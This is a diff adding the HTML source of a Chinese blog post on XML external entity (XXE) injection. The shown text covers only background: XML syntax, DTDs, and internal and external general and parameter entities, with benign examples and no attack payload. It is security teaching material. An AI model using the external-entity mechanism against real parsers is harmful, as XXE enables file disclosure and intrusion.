@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Lethe">
+
+
+    <meta name="subtitle" content="Life is a struggle">
+
+
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>XML实体注入攻击 | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">XML实体注入攻击</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 15, 2019&nbsp;&nbsp;22:13:05</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/System-Security/">System Security</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a>0x01 基础知识</h3><br>
+
+<h5 id="一、XML"><a href="#一、XML" class="headerlink" title="一、XML"></a>一、XML</h5><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xml/index.asp">XML教程</a></p>
+<p><strong>1、什么是 XML?</strong></p>
+<ul>
+<li><p>XML 指可扩展标记语言（EXtensible Markup Language）</p>
+</li>
+<li><p>XML 是一种标记语言，很类似 HTML</p>
+</li>
+<li><p>XML 的设计宗旨是传输数据，而非显示数据</p>
+</li>
+<li><p>XML 标签没有被预定义。您需要自行定义标签</p>
+</li>
+<li><p>XML 被设计为具有自我描述性。</p>
+</li>
+<li><p>XML 是 W3C 的推荐标准</p>
+</li>
+</ul>
+<p><strong>2、XML 与 HTML 的主要差异</strong></p>
+<ul>
+<li><p>XML 不是 HTML 的替代。</p>
+</li>
+<li><p>XML 和 HTML 为不同的目的而设计：</p>
+</li>
+<li><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p>
+</li>
+<li><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
+</li>
+<li><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
+</li>
+</ul>
+<p><strong>3、XML语法规则</strong></p>
+<ul>
+<li><p>所有 XML 元素都须有关闭标签</p>
+</li>
+<li><p>XML 标签对大小写敏感</p>
+</li>
+<li><p>XML 必须正确地嵌套</p>
+</li>
+<li><p>XML 文档必须有根元素</p>
+</li>
+<li><p>XML 的属性值须加引号</p>
+</li>
+<li><p>XML 中的注释与HTML类似</p>
+</li>
+<li><p>在 XML 中，空格会被保留</p>
+</li>
+<li><p>XML 以 LF 存储换行</p>
+</li>
+</ul>
+<p><strong>4、XML示例：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;CHILDREN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端，上述实例可以用下图表示：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XML-entity-injection-attack/20190815210141912.png" alt="在这里插入图片描述"></p>
+<p><strong>5、XML实体引用</strong></p>
+<p>在 XML 中，一些字符拥有特殊的意义。如果把字符 <code>&lt;</code> 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p>
+<p>这样会产生 XML 错误：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了避免这个错误，用实体引用来代替 <code>&lt;</code> 字符：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>if salary &lt; 1000 then<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 XML 中，有 5 个预定义的实体引用：<br><img src="https://gitee.com/Lethesec/oss/raw/master/Blog/XML-entity-injection-attack/20190815210615212.png" alt="在这里插入图片描述"><br><br></p>
+<h5 id="二、DTD"><a href="#二、DTD" class="headerlink" title="二、DTD"></a>二、DTD</h5><p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/dtd/index.asp">DTD教程</a></p>
+<p><strong>1、什么是DTD?</strong></p>
+<ul>
+<li><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p>
+</li>
+<li><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</p>
+</li>
+<li><p>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p>
+</li>
+<li><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+</li>
+</ul>
+<p><strong>2、内部的 DOCTYPE 声明</strong></p>
+<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>带有 DTD 的 XML 文档实例:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>//定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>定义 to 元素为 &quot;#PCDATA&quot; 类型</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>定义 from 元素为 &quot;#PCDATA&quot; 类型</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Georage<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>3、外部文档声明</strong></p>
+<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这是包含 DTD 的 “note.dtd” 文件：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><strong>4、DTD实体</strong><br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p>
+<p>实体又分为一般实体和参数实体:</p>
+<ul>
+<li><p>一般实体指代的是将来XML数据文档要用到的文本或数据。</p>
+</li>
+<li><p>而参数实体是在DTD文档内定义的一种DTD信息，所代表的是DTD定义的一部分，不能在XML文档中使用，也不能在DTD中定义。</p>
+</li>
+</ul>
+<p><strong>（1）一般实体的声明语法:</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>引用实体的方式：<code>&amp;实体名;</code></p>
+<p><strong>a. 内部一般实体声明：</strong></p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; </span><br></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Donald Duck.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright runoob.com&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+<p><strong>b. 外部一般实体声明</strong></p>
+<p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name SYSTEM &quot;URI/URL&quot;&gt; </span><br></pre></td></tr></table></figure>
+
+<p>实例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+
+<p><strong>（2）参数实体的声明格式：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名 <span class="string">&quot;实体内容&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>引用实体的方式：<code>%实体名;</code></p>
+<p><strong>a. 内部参数实体</strong></p>
+<p>参数实体不能被应用在元素的声明当中，不能使用参数实体来定义元素，只有在外部DTD中参数实体才能被应用到元素的声明当中。</p>
+<p>test.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">person</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;test323.dtd&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>test.dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">person</span> (<span class="keyword">name</span>,<span class="keyword">addr</span>,<span class="keyword">tel</span>,<span class="keyword">br</span>,<span class="keyword">email</span>)&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ENTITY %name <span class="string">&quot;(#PCDATA)&quot;</span>&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">addr</span> %name;&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">tel</span> %name;&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">br</span> <span class="keyword">EMPTY</span>&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">email</span> %name;&gt;</span>  </span><br></pre></td></tr></table></figure>
+<p>参数实体必须先定义再使用，而不能像一般实体那样随意放置。</p>
+<p><strong>b. 外部参数实体</strong></p>
+<p>能将原来很长的DTD文档转变成一个很小的、相互调用的文档集合，适合大型DTD文档的设计开发。</p>
+<p>test.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">person</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">person</span> (<span class="keyword">name</span>,<span class="keyword">addr</span>,<span class="keyword">tel</span>,<span class="keyword">br</span>,<span class="keyword">email</span>)&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % （注意这里有个空格）content <span class="keyword">SYSTEM</span> <span class="string">&quot;test323.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">%content;  </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">person</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jason<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">addr</span>&gt;</span>Shanghai<span class="tag">&lt;/<span class="name">addr</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">tel</span>&gt;</span>18701772821<span class="tag">&lt;/<span class="name">tel</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">email</span>&gt;</span>18701772821@163.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">person</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>test.dtd</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">addr</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">tel</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">br</span> <span class="keyword">EMPTY</span>&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">email</span> (<span class="keyword">#PCDATA</span>)&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<br>
+
